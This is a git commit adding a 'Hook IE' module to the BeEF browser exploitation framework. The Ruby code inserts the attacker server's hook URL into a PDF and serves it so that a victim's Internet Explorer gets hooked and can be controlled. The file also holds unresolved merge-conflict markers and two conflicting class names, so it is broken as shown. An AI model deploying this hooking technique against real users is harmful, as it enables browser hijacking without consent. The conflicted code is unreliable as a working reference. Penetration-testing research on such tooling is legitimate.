a7acaa319273b37e946a3067a46064edb266f9c6
a.m.saafan@gmail.com <a.m.saafan@gmail.com@b87d56ec-f9c0-11de-8c8a-61c5e9addfc9>
2011-07-23 17:44:46 +0000

    - Added module: Hook IE. [Issue #: 219]
    git-svn-id: https://beef.googlecode.com/svn/trunk@1088 b87d56ec-f9c0-11de-8c8a-61c5e9addfc9

---
+++ modules/browser/hook_ie/module.rb
@@ -0,0 +1,78 @@
+<<<<<<< .mine
+class Hook_ie < BeEF::Core::Command
+=======
+#
+#   Copyright 2011 Wade Alcorn wade@bindshell.net
+#
+#   Licensed under the Apache License, Version 2.0 (the "License");
+#   you may not use this file except in compliance with the License.
+#   You may obtain a copy of the License at
+#
+#       http://www.apache.org/licenses/LICENSE-2.0
+#
+#   Unless required by applicable law or agreed to in writing, software
+#   distributed under the License is distributed on an "AS IS" BASIS,
+#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+#   See the License for the specific language governing permissions and
+#   limitations under the License.
+#
+class Detect_details < BeEF::Core::Command
+>>>>>>> .r1087
+  
+  def initialize
+    super({
+      'Name' => 'Hook IE',
+      'Description' => %Q{
+       This module will attempt to hook IE if it is the default browser.'
+        },
+      'Category' => 'Browser',
+      'Author' => ['saafan'],
+      'File' => __FILE__
+    })
+		
+		#Get the servers configurations.
+    configuration = BeEF::Core::Configuration.instance
+		
+		#The hook url to be replace the token in the original pdf file.
+		hook_uri = "http://#{configuration.get("beef.http.dns")}:#{configuration.get("beef.http.port")}#{configuration.get("beef.http.demo_path")}"
+		
+		# A new pdf file containg the actual hook URI instead of the dummy token.
+		configured_hook_file = File.open("./modules/browser/hook_ie/bounce_to_ie_configured.pdf","w")
+		
+		# The original pdf file contains a token that will get replaced during the initialization with
+		# the actual hook URI of beef. Note that the hook URI is accessed via the DNS name.
+		File.open('./modules/browser/hook_ie/bounce_to_ie.pdf',"r") { |original_hook_file|
+			original_hook_file.each_line { |line|				
+				# If the line includes the hook token, then replace it with the actual hook URI
+				if(line.include? '<hookURI>')
+					line = line.sub(/<hookURI>/, hook_uri)
+				end
+				#write the line to a new file
+				configured_hook_file.write(line)
+			}
+		}
+		
+		configured_hook_file.close()
+		
+		
+		#Bind the configured PDF file to the web server.
+		BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/browser/hook_ie/bounce_to_ie_configured.pdf', '/report', 'pdf', -1); 
+    
+		set_target({
+        'verified_status' =>  VERIFIED_WORKING, 
+        'browser_name' =>     ALL
+    })
+    
+    use 'beef.dom'
+    use_template!
+  end
+
+  def callback
+    content = {}
+    content['result'] = @datastore['result']    
+    
+    save content
+    #update_zombie!
+  end
+  
+end
